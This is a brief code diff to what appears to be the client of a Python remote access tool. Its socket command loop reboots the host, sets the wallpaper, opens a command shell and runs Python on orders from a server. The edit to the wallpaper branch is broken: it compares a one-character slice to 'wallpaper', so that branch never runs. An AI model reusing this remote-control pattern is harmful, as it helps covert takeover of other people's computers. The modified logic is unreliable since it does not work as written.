@@ -603,8 +603,9 @@ while True:
                 shutdown("-r")
             elif strData == "test":
                 continue
-            elif strData[:3] == "wallpaper":
-                setWallpaper(strData[3:])
+            elif strData[:1] == "wallpaper":
+                print(strData[:])
+                setWallpaper(strData[1:])
             elif strData == "cmd":
                 command_shell()
             elif strData == "python":
@@ -624,7 +625,6 @@ while True:
     except socket.error:  # if the server closes without warning
         objSocket.close()
         del objSocket
-        # server_connect()
     except Exception:
         pass
     finally:
